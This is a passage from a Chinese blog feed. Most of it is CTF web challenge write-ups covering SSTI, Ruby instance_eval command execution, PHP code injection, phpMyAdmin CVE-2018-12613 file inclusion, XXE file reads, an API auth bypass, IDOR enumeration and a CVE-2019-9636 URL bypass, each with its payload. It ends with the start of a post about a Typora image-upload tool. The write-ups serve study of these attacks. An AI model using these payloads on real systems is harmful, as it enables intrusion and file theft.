Key2。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">key2 &#x3D; flag0x085927</span><br></pre></td></tr></table></figure><p>回到 <code>.../post.html</code> 提交两个 Key，可以得到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">D33P&#123;h3r3_1s_y0ur_7r0ll_fl4g&#125;</span><br></pre></td></tr></table></figure><h3 id="Greetings"><a href="#Greetings" class="headerlink" title="Greetings!"></a>Greetings!</h3><p><span style="padding: 0.25rem 0.375rem;background-color: #185c37;color: #fff;font-size: 0.75rem;margin-right: 5px;">SSTI</span></p><p>根据题目提示，传递一个 GET 参数 <code>?name=you</code> 可以得到 Hello you 的反馈。于是试了一手 <code>{{7 * 7}}</code> 得到了 Hello 49 的反馈，可以确定是 SSTI 的考点，然后发现了 tornado。顺势试了下 <code>?name={{__import__("os").popen("ls").read()}}</code> 找到了 <code>flag.txt</code>。于是再构造 <code>cat flag.txt</code> 得到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d33p&#123;I_&lt;3_3000&#125;</span><br></pre></td></tr></table></figure><h3 id="Hack-MEEEE"><a href="#Hack-MEEEE" class="headerlink" title="Hack MEEEE"></a>Hack MEEEE</h3><p><span style="padding: 0.25rem 0.375rem;background-color: #b8391a;color: #fff;font-size: 0.75rem;margin-right: 5px;">Ruby</span></p><p>上来先看了一手这题源码，找到了 <code> &lt;!-- This application is made using ruby! &lt;3 --&gt;</code> 的提示，然后当时触及到了知识盲区，就没管。其实翻了一波手册再查了一下之后发现很简单。页面请求传递了两个 POST 参数。这里有个坑，<code>method</code> 要放在前面，不然 POST 本身的换行符加上之后可能不会有正确结果返回。（报错在页面源码的注释中可以看到）</p><p>按照 Ruby 的手册，使用 <code>method=methods</code> 和 <code>method=private_methods</code> 可以查看当前类下包含的方法。于是找到了可以利用的反引号。<a href="https://ruby-doc.org/core-2.2.0/Kernel.html#method-i-60">手册参考</a>  结合上 <code>instance_eval</code> 这个方法就能达成目的。</p><p>因此，构造 <code>method=instance_eval&message=`ls`</code> 的 POST 请求参数，可以得到 flag.txt 位于当前目录下的线索，于是只需要再构造 <code>cat flag.txt</code> 即可得到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d33p&#123;send_is_a_very_dangerous_method&#125;</span><br></pre></td></tr></table></figure><hr><div style="pointer-events: none"><h2 style="display:none" id="TG:Hack">TG:Hack</h2><img src="https://ae01.alicdn.com/kf/H29783c4fda224c86816742291e422c4ei.png"/></div><h3 id="Shop"><a href="#Shop" class="headerlink" title="Shop"></a>Shop</h3><p>题目一开始，给了 bank 和 store 的两个页面，我们知道“衬衫的价格是九镑十五便士”。啊，不是，是二十五美元。这题嘛，其实不能按照一般思路去想，一开始我在 bank 页面试了好久都加不上钱，然后就只能去 store 页面找。每买一件东西都会传递两个 POST 参数，分别指代物品类别和钱数。所以，把钱数想办法变成负数就可以从商店“索要”金钱了。但是还有一个点，使用已经存在的物品 ID 不可信，所以就随便整个其他的 ID 就行。这里还有一个坑，POST 参数最后的换行符会有影响（所以 HackBar 不行），我使用某在线的 POST 工具就成功达成目的了。最后就可以买到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TG20&#123;I_just_want_to_buy_a_real_flag&#125;</span><br></pre></td></tr></table></figure><h3 id="Redux"><a href="#Redux" class="headerlink" title="Redux"></a>Redux</h3><p>这题，说实话我其实没太看懂。首先随便填一填他给的表，然后提交，Console 里就能看到一条消息 <code>The form has been submitted! Look at the Redux store!</code>。我一开始也想知道这个 Redux store 指的是哪里，但是找了几下没找到。看到这条消息是来自 form.js 的，于是就顺手点开看了看。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> mainReducer = <span class="function">(<span class="params">state = initialState, action</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">switch</span> (action.type) &#123;</span><br><span class="line">    <span class="keyword">case</span> types.ADD_COLONIST_NUMBER:</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">&quot;Payload is&quot;</span> + action.payload);</span><br><span class="line">      <span class="keyword">return</span> &#123; ...state, <span class="attr">colonist_number</span>: action.payload &#125;;</span><br><span class="line">    <span class="keyword">case</span> types.ADD_FIRST_NAME:</span><br><span class="line">      <span class="keyword">return</span> &#123; ...state, <span class="attr">firstName</span>: action.payload &#125;;</span><br><span class="line">    <span class="keyword">case</span> types.ADD_LAST_NAME:</span><br><span class="line">      <span class="keyword">return</span> &#123; ...state, <span class="attr">lastName</span>: action.payload &#125;;</span><br><span class="line">    <span class="keyword">case</span> types.ADD_FACTION:</span><br><span class="line">      <span class="keyword">return</span> &#123; ...state, <span class="attr">faction</span>: action.payload &#125;;</span><br><span class="line">    <span class="keyword">case</span> types.SUBMIT_FORM:</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">&quot;The form has been submitted! Look at the Redux store!&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> &#123; ...state, <span class="attr">submitted</span>: <span class="string">&quot;TG20&#123;always_disable_redux_dev_tools&#125;&quot;</span> &#125;;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">return</span> state;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>于是就找到了 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TG20&#123;always_disable_redux_dev_tools&#125;</span><br></pre></td></tr></table></figure><hr><div style="pointer-events: none"><h2 style="display:none" id="AUCTF">AUCTF</h2><img src="https://ae01.alicdn.com/kf/H77d23afec21d418db8da7ea3053610faz.png"/></div><h3 id="Miyazaki-Trivia"><a href="#Miyazaki-Trivia" class="headerlink" title="Miyazaki Trivia"></a>Miyazaki Trivia</h3><p>打开页面有 <code>Find this special file.</code> 的提示，于是找到 <code>.../robots.txt</code>。打开之后又是新的提示 <code>VIDEO GAME TRIVIA: What is the adage of Byrgenwerth scholars? MAKE a GET request to this page with a header named &#39;answer&#39; to submit your answer.</code>，查了一下之后得到答案，于是构造 <code>?answer=Fear the Old Blood</code> 得到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auctf&#123;f3ar_z_olD3_8l0oD&#125;</span><br></pre></td></tr></table></figure><h3 id="Quick-Maths"><a href="#Quick-Maths" class="headerlink" title="Quick Maths"></a>Quick Maths</h3><p>这题先随便算几个数，发现可以正常算出结果。（不太记得了，写的时候好像算了 7 * 7 啥的，得到的都是49）于是顺手构造了个 <code>statement=system(&quot;ls&quot;)</code> 然后发现有返回结果。于是就安排上 <code>statement=system(&quot;cat ./index.php&quot;)</code> 就拿到了 flag。需要注意的是，这里的请求包需要用 Burp Suite 发送才能得到返回的结果。 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auctf&#123;p6p_1nj3c7i0n_iz_k:3w1&#125;</span><br></pre></td></tr></table></figure><h3 id="gg-no-re"><a href="#gg-no-re" class="headerlink" title="gg no re"></a>gg no re</h3><p>这题一开始给了个 authentication.js，略微分析之后可以发现是 Base64，取出关键信息 <code>TWFrZSBhIEdFVCByZXF1ZXN0IHRvIC9oaWRkZW4vbmV4dHN0ZXAucGhw</code>再解码，得到 <code>Make a GET request to /hidden/nextstep.php</code>。按照提示进行，在 Header 中可以找到下一步线索，<code>ROT13: Znxr n CBFG erdhrfg gb /ncv/svany. CuC</code>。使用工具解密一下，得到 <code>Make a POST request to /api/ final. PhP</code>，接着按照提示 <code>Send a request with the flag variable set</code> 进行，构造 <code>?flag=1</code> 即可得到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auctf&#123;1_w@s_laZ_w1t_dis_0N3&#125;</span><br></pre></td></tr></table></figure><h3 id="API-madness"><a href="#API-madness" class="headerlink" title="API madness"></a>API madness</h3><p>按照提示访问 <code>.../static/help</code> 可以看到有三个 API。先尝试一下 login，这里有个坑，要用 curl 发请求才能成功 <code>curl -X POST -H &quot;Content-Type: application/json&quot; -d &#39;&#123;&quot;username&quot;:&quot;lemon&quot;,&quot;password&quot;:&quot;password&quot;&#125;&#39; host/api/login</code>，而且响应的时间很长很长，返回的数据是一个报错的页面，里面包含了一个不一样的接口 <code>.../api/login_check</code>。curl 访问之后得到了一个为 null 的 token。看起来像是假的一样，但是就像爱情，你不去尝试怎么知道结果呢？于是按照 API 接口接着往前冲，构造 <code>curl -X POST -H &quot;Content-Type: application/json&quot; -d &#39;&#123;&quot;dir&quot;:&quot;/&quot;,&quot;token&quot;:&quot;null&quot;&#125;&#39; host/api/ftp/dir</code>，返回结果中看到了 flag.txt。于是构造 <code> curl -X POST -H &quot;Content-Type: application/json&quot; -d &#39;&#123;&quot;file&quot;:&quot;/flag.txt&quot;,&quot;token&quot;:&quot;null&quot;&#125;&#39; host/api/ftp/get_file</code> 得到结果。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;file_data&quot;: &quot;YXVjdGZ7MHdAc3BfNnJvSzNOX0B1dGh9Cg&#x3D;&#x3D;\n&quot;,</span><br><span class="line">  &quot;status&quot;: &quot;OK&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>取出 <code>YXVjdGZ7MHdAc3BfNnJvSzNOX0B1dGh9Cg==</code> 之后 Base64 解码即得 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auctf&#123;0w@sp_6roK3N_@uth&#125;</span><br></pre></td></tr></table></figure><hr><div style="pointer-events: none"><h2 style="display:none" id="GWCTF-2019">GWCTF 2019</h2><img src="https://ae01.alicdn.com/kf/U4dcb925e60b64dd5a0f67b144894716aB.png"/></div><h3 id="我有一个数据库"><a href="#我有一个数据库" class="headerlink" title="我有一个数据库"></a>我有一个数据库</h3><p>这题上来就说了数据库，但是打开页面发现没得入口，只有两行字。于是尝试找了一下特殊文件，找到了 robots.txt。文件里给了个 phpinfo.php，但是打开之后没找到啥利用点。但是由于自己搭环境的时候出了些问题，于是去查了一波，就事先知道了这题有个 phpmyadmin，如果真的打比赛估计找不到这个点。不过他给的 phpmyadmin 很奇怪，不需要登录就能操作数据库。于是就去查了一波相关的知识点，找到了 <a href="https://blog.csdn.net/qq_33020901/article/details/80829269">CVE-2018-12613</a>。</p><p>于是照着教程，构造 <code>.../index.php?target=db_events.php%3f/../../../../../flag</code> 就能够包含到在根目录的 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gwctf&#123;JUst_q_1I111l1Il11DAYS&#125;</span><br></pre></td></tr></table></figure><h3 id="枯燥的抽奖"><a href="#枯燥的抽奖" class="headerlink" title="枯燥的抽奖"></a>枯燥的抽奖</h3><p>页面给了十个随机字母，查看网页源代码可以发现一个 check.php，访问之后可以拿到随机数生成的方法，按照 <a href="https://lemonprefect.cn/posts/78cb5320/#Ezaudit">MRCTF-Ezaudit</a> 的套路用 php_mt_seed 这个工具算一波随机数种子，然后再用 PHP 生成后面十位就行了。这里踩了一个坑，工具的版本很重要，我之前使用的那个在这题算不出来而且能算出来的也不会告知 PHP 的版本号。至于生成适合工具使用的参数格式嘛，我写了一段 PHP 代码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$str</span> = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;</span><br><span class="line"><span class="variable">$key</span> = str_split(<span class="string">&quot;oS668h2wc9&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$key</span> <span class="keyword">as</span> <span class="variable">$i</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> strpos(<span class="variable">$str</span>,<span class="variable">$i</span>) . <span class="string">&quot; &quot;</span> . strpos(<span class="variable">$str</span>,<span class="variable">$i</span>) . <span class="string">&quot; 0 &quot;</span> . <span class="string">&quot;61 &quot;</span>;</span><br></pre></td></tr></table></figure><p>如果前面的步骤都没有错，算出来的随机数种子应该是 <code>951373997</code>。放到给出的源码中然后解除 10 位的限制，可以得到二十位的字符串 <code>oS668h2wc93iAcrwCuZQ</code>。提交到页面上即可得到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Y0u_wIN_abcdefghijklmnopqrstuvwxyz&#125;</span><br></pre></td></tr></table></figure><p>(后面的题目环境搭好了 题目好像很顶  让我慢慢写一波)</p><div style="pointer-events: none"><h2 style="display:none" id="Sharky-CTF-2020">Sharky CTF 2020</h2><img src="https://ae01.alicdn.com/kf/Ucf1568c6275645d9b215b1d9e92a7711j.jpg"/></div><h3 id="XXExternalXX"><a href="#XXExternalXX" class="headerlink" title="XXExternalXX"></a>XXExternalXX</h3><p>上来点 Show stored data 探索一波，注意到了地址栏的 <code>?xml=data.xml</code> 察觉到可能是 XXE。随便填充之后在报错里发现了 <code>Trying to get property &#39;data&#39; of non-object</code>，于是根据题目描述顺手构造一波。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">Lemon</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">flag</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///flag.txt&quot;</span>&gt;</span> </span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">data</span>&gt;</span><span class="symbol">&amp;flag;</span><span class="tag">&lt;/<span class="name">data</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这里因为是个 GET 参数，所以得想办法给构造的 payload 一个直链才能成功，达成之后可得 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shkCTF&#123;G3T_XX3D_f5ba4f9f9c9e0f41dd9df266b391447a&#125; </span><br></pre></td></tr></table></figure><h3 id="Logs-In-Part-1"><a href="#Logs-In-Part-1" class="headerlink" title="Logs In ! Part 1"></a>Logs In ! Part 1</h3><p>这题千万不要被标题迷惑，访问页面之后可以在左下角找到 Controller 的页面，顺手访问一波之后可以看到两个路由，访问其中一个 <code>/e48e13207341b6bffb7fb1622282247b/debug</code> 可得 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shkCTF&#123;0h_N0_Y0U_H4V3_4N_0P3N_SYNF0NY_D3V_M0D3_1787a60ce7970e2273f7df8d11618475&#125;</span><br></pre></td></tr></table></figure><h3 id="Containment-Forever"><a href="#Containment-Forever" class="headerlink" title="Containment Forever"></a>Containment Forever</h3><p>这题的两条 flag 没办法打开，但是有其他记录可以访问。根据地址猜测应该是要自己找到这个类似于 ID 的东西。于是尝试随便改一波，发现报错了且找到了 <code>mongoose</code> 的字样。在大佬的指引下找到了 <a href="https://docs.mongodb.com/manual/reference/method/ObjectId/">参考</a>，于是开始把页面上原来的 ID 拆开。</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">string</span> [] items = &#123;</span><br><span class="line">                <span class="string">&quot;5e70da94d7b1600013655bb5&quot;</span>,</span><br><span class="line">                <span class="string">&quot;5e7e4f48d7b1600013655bb9&quot;</span>,</span><br><span class="line">                <span class="string">&quot;5e83642bd7b1600013655bba&quot;</span>,</span><br><span class="line">                <span class="string">&quot;5e8ee635d7b1600013655bbd&quot;</span></span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="keyword">for</span>(<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)&#123;</span><br><span class="line">                <span class="built_in">decimal</span>[] parts = <span class="keyword">new</span> <span class="built_in">decimal</span>[<span class="number">3</span>];</span><br><span class="line">                parts[<span class="number">0</span>] = Convert.ToInt64(items[i].Substring(<span class="number">0</span>, <span class="number">8</span>),<span class="number">16</span>);</span><br><span class="line">                parts[<span class="number">1</span>] = Convert.ToInt64(items[i].Substring(<span class="number">8</span>, <span class="number">10</span>),<span class="number">16</span>);</span><br><span class="line">                parts[<span class="number">2</span>] = Convert.ToInt64(items[i].Substring(<span class="number">17</span>, <span class="number">7</span>),<span class="number">16</span>);</span><br><span class="line">                Console.WriteLine(<span class="string">$&quot;TimeStamp:<span class="subst">&#123;parts[<span class="number">0</span>]&#125;</span>\nRandomValue:<span class="subst">&#123;parts[<span class="number">1</span>]&#125;</span>\nIncrementingCounter:<span class="subst">&#123;parts[<span class="number">2</span>]&#125;</span>\n&quot;</span>);</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>然后发现随机数是固定的，也就是说只需要时间戳和 ID。时间戳只需要从两条记录上找然后转换一下，很容易得到。</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2020-03-21 09:13:22  1584782002</span><br><span class="line">2020-04-13 15:50:18  1586793018</span><br></pre></td></tr></table></figure><p>至于 ID 的话只需要根据已经有的 ID 在附近枚举一下就可以了。于是写段代码生成一下。</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Int64[] timeStamps = &#123;<span class="number">1584782002</span>, <span class="number">1586793018</span>&#125;;</span><br><span class="line">            <span class="keyword">for</span>(<span class="built_in">int</span> j = <span class="number">56974256</span>; j &lt; <span class="number">56974275</span>; j++)&#123;</span><br><span class="line">                <span class="built_in">string</span> [] deParts = <span class="keyword">new</span> <span class="built_in">string</span>[<span class="number">3</span>];</span><br><span class="line">                deParts[<span class="number">0</span>] = Convert.ToString(timeStamps[<span class="number">1</span>],<span class="number">16</span>);</span><br><span class="line">                deParts[<span class="number">1</span>] = Convert.ToString(<span class="number">926393827347</span>, <span class="number">16</span>);</span><br><span class="line">                deParts[<span class="number">2</span>] = Convert.ToString(j, <span class="number">16</span>);</span><br><span class="line">                Console.WriteLine(<span class="string">$&quot;<span class="subst">&#123;deParts[<span class="number">0</span>]&#125;</span><span class="subst">&#123;deParts[<span class="number">1</span>]&#125;</span><span class="subst">&#123;deParts[<span class="number">2</span>].Substring(<span class="number">1</span>,<span class="number">6</span>)&#125;</span>&quot;</span>);</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>将得到的几个结果逐一尝试可以得到包含 flag 的两个记录的地址。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">...&#x2F;item&#x2F;5e75dab2d7b1600013655bb8</span><br><span class="line">...&#x2F;item&#x2F;5e948a3ad7b1600013655bbf</span><br></pre></td></tr></table></figure><p>将得到的 flag 拼接在一起，得到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shkCTF&#123;IDOR_IS_ALS0_P0SSIBLE_W1TH_CUST0M_ID!_f878b1c38e20617a8fbd20d97524a515&#125;</span><br></pre></td></tr></table></figure><h3 id="Aqua-World"><a href="#Aqua-World" class="headerlink" title="Aqua World"></a>Aqua World</h3><p>打开页面，发现导航有个点不动的地方，审查元素访问到 <code>.../admin-query?flag=flag</code>。页面提示需要修改 netloc 为本地。在各种修改 header 之后看到了题目给的 hint：<code>WTF this PYTHON version is deprecated!!!</code>。于是顺着线索找到了 <a href="https://bugs.python.org/issue36216">CVE-2019-9636</a> 并根据其中给出的例子构造（Authorization 的 header 是题目本身要求的）。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;Authorization&quot;</span> : <span class="string">&quot;Basic YW5vbnltb3VzOmFub255bW91cw==&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">response = requests.get(<span class="string">&quot;.../admin-query\uFF03@127.0.0.1?flag=flag&quot;</span>,headers=headers)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure><p>需要注意的是，这里执行脚本的 Python 也需要使用有漏洞的版本，否则请求无法成功完成。（这部分还需要复现</p><p>使用特定版本发起请求后即可在响应中找到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shkCTF&#123;NFKC_normalization_can_be_dangerous!_8471b9b2da83011a07efc2899819da65&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Typora图床插件记</title>
      <link href="/zh-CN/posts/f4f59164.html"/>
      <url>/zh-CN/posts/f4f59164.html</url>
      
        <content type="html"><![CDATA[<p><span><span style="padding: 0.25rem 0.375rem;background-color: #103f91;color: #fff;font-size: 0.75rem;margin-right: 5px;">Note</span><span style="font-size: 0.85rem">此文章由 LemonPrefect 基于 <a href="https://creativecommons.org/publicdomain/zero/1.0/deed.zh">Creative Commons - CC0 International</a> 协议发布，所有内容仅限于学习交流。</span></span></p><p>用 jsDelivr 做图床蛮久了，但是每次更新图片都要 release。好像要反复占用空间，这样薅多了不太好，所以就结合最近在 v2ex 上看到的一个接口，给 Typora 写了个上传插件。（其实可以用 SMMS 的服务，但是我觉得有点慢）</p><p><escape><span id="more"></span></escape></p><p><span style="color: #0078d7">文章的内容更新啦！因为换了接口，所以建议跳过后面 BUG 修复的部分，或者仅作为严谨性参考（虽然本身也不严谨）</span></p><p><span style="color: #0078d7">此文档最后更新于很多天以前，其中的某些方法已经失效啦（其实调整一下就好了，但毕竟是学习研究，就不放出来啦（自己试试看吧（逃x</span></p><h3 id="读-API-文档"><a href="#读-API-文档" class="headerlink" title="读 API 文档"></a>读 API 文档</h3><p>顺着 v2ex 的作者的站点，我找到了 API 提供方和相关的文档，相关摘要如下（为了更好理解做了部分修改）。</p><table><thead><tr><th align="left">参数名称</th><th align="left">必填</th><th align="left">类型</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">imgurl</td><td align="left">否</td><td align="left">string</td><td align="left">图片链接上传地址</td></tr><tr><td align="left">file</td><td align="left">是</td><td align="left">string</td><td align="left">文件流上传方式 必须为“multipart”</td></tr><tr><td align="left">Filedata</td><td align="left">是</td><td align="left">string</td><td align="left">文件流</td></tr></tbody></table><p>接下来就是 Typora 方面对于图片上传插件的要求（相关要点用高亮标出）。</p><p>You could config a custom command to upload images, using tools that is not listed in above options, or event write your own tools / scripts. Typora will append all images that needs to be uploaded after the custom command you filled.</p><p>Then, Typora will <span class="HighlightWKT7BlueGreen">fetch image urls from the last N lines</span> of the standard output of your custom command. (N is the number of images to upload).</p><p>For example, if you write a tool <code>upload-image.sh</code>, then you can input <code>[some path]/upload-image.sh</code> in the command filed. <span class="HighlightWKT7BlueGreen">Typora will call <code>[some path]/upload-image.sh &quot;image-path-1&quot; &quot;image-path-2&quot;</code> to upload two images located in <code>image-path-1</code> and <code>image-path-2</code>.</span> Then the command may return something like:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Upload Success:</span><br><span class="line">http:&#x2F;&#x2F;remote-image-1.png</span><br><span class="line">http:&#x2F;&#x2F;remote-image-2.png</span><br></pre></td></tr></table></figure><p>Then Typora will get the two remote image url from the output, and replace the original local images used in the Markdown document.</p><p>主要就是上传图片然后依次输出地址以供引用。（没看到报错怎么定义，所以后面就随便写了）</p><h3 id="快速开发与踩坑记录"><a href="#快速开发与踩坑记录" class="headerlink" title="快速开发与踩坑记录"></a>快速开发与踩坑记录</h3><p>既然需要用可执行的，也就 Poweshell 和 C# 还有 C/C++ 编译出的文件可以这样执行了吧。（也不一定）于是就想着用 C# 写一个简单的 exe，因为 C# 上就可以用我很喜欢的 <a href="http://flurl.dev/">Flurl</a> 了。</p><p>安装好库之后就开始面向文档写请求了，但是 Flurl 网站上给的文档不够完全，导致相关的 <code>PostMultipartAsync()</code> 方法使用方法不详细。好在我在 Stack Overflow 上找到了<a href="https://stackoverflow.com/questions/41042591/how-can-i-upload-a-file-and-form-data-using-flurl">相关的问题</a>。这里贴上相关的用法。</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> resp = <span class="keyword">await</span> <span class="string">&quot;http://api.com&quot;</span></span><br><span class="line">    .PostMultipartAsync(mp =&gt; mp</span><br><span class="line">        .AddString(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;hello!&quot;</span>)                <span class="comment">// individual string</span></span><br><span class="line">        .AddStringParts(<span class="keyword">new</span> &#123;a = <span class="number">1</span>, b = <span class="number">2</span>&#125;)         <span class="comment">// multiple strings</span></span><br><span class="line">        .AddFile(<span class="string">&quot;file1&quot;</span>, path1)                    <span class="comment">// local file path</span></span><br><span class="line">        .AddFile(<span class="string">&quot;file2&quot;</span>, stream, <span class="string">&quot;file.txt&quot;</span>)       <span class="comment">// file stream</span></span><br><span class="line">        .AddJson(<span class="string">&quot;json&quot;</span>, <span class="keyword">new</span> &#123; foo = <span class="string">&quot;x&quot;</span> &#125;)         <span class="comment">// json</span></span><br><span class="line">        .AddUrlEncoded(<span class="string">&quot;urlEnc&quot;</span>, <span class="keyword">new</span> &#123; bar = <span class="string">&quot;y&quot;</span> &#125;) <span class="comment">// URL-encoded   </span></span><br><span class="line">        .Add(content));                             <span class="comment">// any HttpContent</span></span><br></pre></td></tr></table></figure><p>结合 Typora 的“所见即所得”的特性，我们不需要实现多线程和异步操作，毕竟不太可能存在大量图片同时准备上传的情况（当然粘贴大量图片除外），Typora 可以开启粘贴后实时上传的操作，不过这样就不能粘贴含有隐私的图片了，因为这个图床好像没有给出删除相关图片的接口。</p><p>根据文档，我们只需要提供两个 POST 参数即可，因此，请求可以这样构造。（需要注意的是文档中有一个参数是首字母大写的，有点不一样）</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> uploadRespose = uploadUrl.PostMultipartAsync(data =&gt; </span><br><span class="line">                    data.AddString(<span class="string">&quot;file&quot;</span>,<span class="string">&quot;multipart&quot;</span>)</span><br><span class="line">                        .AddFile(<span class="string">&quot;Filedata&quot;</span>,args[i])</span><br><span class="line">                ).Result;</span><br><span class="line"><span class="built_in">string</span> responseData = uploadRespose.ResponseMessage.Content.ReadAsStringAsync().Result;</span><br></pre></td></tr></table></figure><p>然后再从 response 中取出图片链接并次序显示即可。这里加上 Typora 官方文档中的 <code>Upload Success:</code> 以确保跟例子一致。</p><p>当遇到上传错误的时候（code != 1），可以再次上传。（具体上传错误原因因为文档没写出，所以不清楚）因此我简单地声明了个标记次数然后重试。同理，在获取响应时也可以通过判断 http code 来判断 API 是否有正常响应以确定要不要重新上传图片。</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (flag == <span class="number">5</span>)&#123;</span><br><span class="line">Console.WriteLine(<span 